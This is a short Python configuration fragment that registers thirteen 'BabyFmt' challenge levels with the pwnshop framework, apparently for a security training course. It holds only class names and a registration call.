
NUM_TESTING = 1

LEVELS = [
    BabyFmtLevel1,
    BabyFmtLevel2,
    BabyFmtLevel3,
    BabyFmtLevel4,
    BabyFmtLevel5,
    BabyFmtLevel6,
    BabyFmtLevel7,
    BabyFmtLevel8,
    BabyFmtLevel9,
    BabyFmtLevel10,
    BabyFmtLevel11,
    BabyFmtLevel12,
    BabyFmtLevel13,
]


CHOOSE_LEVELS = [
    BabyFmtLevel1,
    BabyFmtLevel2,
    BabyFmtLevel3,
    BabyFmtLevel4,
    BabyFmtLevel5,
    BabyFmtLevel6,
    BabyFmtLevel7,
    BabyFmtLevel8,
    BabyFmtLevel9,
    BabyFmtLevel10,
    BabyFmtLevel11,
    BabyFmtLevel12,
]
pwnshop.register_challenges(LEVELS)
